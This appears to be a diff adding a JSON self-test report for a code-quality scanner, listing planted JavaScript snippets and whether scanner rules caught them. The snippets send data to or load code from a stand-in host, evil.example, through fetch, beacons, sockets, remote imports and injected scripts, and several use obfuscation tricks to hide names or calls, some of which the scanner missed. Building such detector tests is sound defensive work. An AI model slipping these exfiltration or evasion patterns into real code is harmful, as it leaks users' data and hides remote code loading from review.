@@ -1,0 +1,163 @@
+{
+ "kit": "aviary-quality 1.1.0 #9bea240d2a84",
+ "date": "2026-10-24",
+ "method": "each plant appended to the self-test fixture module zz.js; run with --base, --results, --private as the self-test's clean run",
+ "plants": [
+  {
+   "expected_rule": "Q08",
+   "what": "fetch via computed property: window['fe'+'tch']",
+   "plant_zz_js": "window['fe' + 'tch']('https://evil.example/');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "fetch via globalThis bracket",
+   "plant_zz_js": "globalThis['fetch']('https://evil.example/');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "fetch through an alias variable",
+   "plant_zz_js": "var zzF = self['fetch']; zzF('https://evil.example/');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "navigator.sendBeacon",
+   "plant_zz_js": "navigator.sendBeacon('https://evil.example/', 'x');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "XMLHttpRequest",
+   "plant_zz_js": "var zzX = new XMLHttpRequest(); zzX.open('GET', 'https://evil.example/'); zzX.send();\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "WebSocket",
+   "plant_zz_js": "var zzW = new WebSocket('wss://evil.example/');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "EventSource",
+   "plant_zz_js": "var zzE = new EventSource('https://evil.example/s');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "dynamic import of a remote module",
+   "plant_zz_js": "import('https://evil.example/m.js');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "image element created by createElement",
+   "plant_zz_js": "var zzI = document.createElement('img'); zzI.src = 'https://evil.example/p.gif';\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "URL assembled from parts at run time",
+   "plant_zz_js": "var zzU = 'ht' + 'tps:' + '//evil.example/'; fetch(zzU);\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "window.open to carry data away",
+   "plant_zz_js": "window.open('https://evil.example/?d=' + zzHtml);\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "form submit to an outside address",
+   "plant_zz_js": "var zzFo = document.createElement('form'); zzFo.action = 'https://evil.example/'; zzFo.submit();\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q09",
+   "what": "eval through a computed name",
+   "plant_zz_js": "window['ev' + 'al']('1');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q09",
+   "what": "setTimeout with a code string",
+   "plant_zz_js": "setTimeout('alert(1)', 0);\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q09",
+   "what": "constructor of a constructor",
+   "plant_zz_js": "[].constructor.constructor('return 1')();\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q09",
+   "what": "indirect eval (0, eval)",
+   "plant_zz_js": "(0, eval)('1');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q?",
+   "what": "a private name split in two: 'Zeb' + 'edee'",
+   "plant_zz_js": "var zzWho = 'Zeb' + 'edee';\n",
+   "kit_1_1_0_result": "MISSED"
+  },
+  {
+   "expected_rule": "Q?",
+   "what": "a private name reversed and rebuilt at run time",
+   "plant_zz_js": "var zzWho2 = 'eedebeZ'.split('').reverse().join('');\n",
+   "kit_1_1_0_result": "MISSED"
+  },
+  {
+   "expected_rule": "Q?",
+   "what": "a private name as character codes",
+   "plant_zz_js": "var zzWho3 = String.fromCharCode(90,101,98,101,100,101,101);\n",
+   "kit_1_1_0_result": "MISSED"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "protocol-relative image inside innerHTML",
+   "plant_zz_js": "document.body.innerHTML += '<img src=//evil.example/x.gif>';\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "CSS url() in a style string",
+   "plant_zz_js": "document.body.style.background = 'url(https://evil.example/p.png)';\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "document.write of an outside script",
+   "plant_zz_js": "document.write('<scr' + 'ipt src=https://evil.example/a.js></scr' + 'ipt>');\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "location.assign",
+   "plant_zz_js": "location.assign('https://evil.example/?d=' + zzHtml);\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q08",
+   "what": "an anchor ping attribute",
+   "plant_zz_js": "var zzA = '<a href=\"#\" ping=\"https://evil.example/\">x</a>';\n",
+   "kit_1_1_0_result": "MISSED"
+  },
+  {
+   "expected_rule": "Q11",
+   "what": "data sent through the brain port with no seam listed",
+   "plant_zz_js": "function zzLeak() { return P.brain.tell(JSON.stringify(localStorage), '', 'x'); }\n",
+   "kit_1_1_0_result": "CAUGHT"
+  },
+  {
+   "expected_rule": "Q11",
+   "what": "Quill called through an alias, no seam listed",
+   "plant_zz_js": "var zzAI = P.ai; function zzAsk2(t) { return zzAI.json(t); }\n",
+   "kit_1_1_0_result": "CAUGHT"
+  }
+ ]
+}
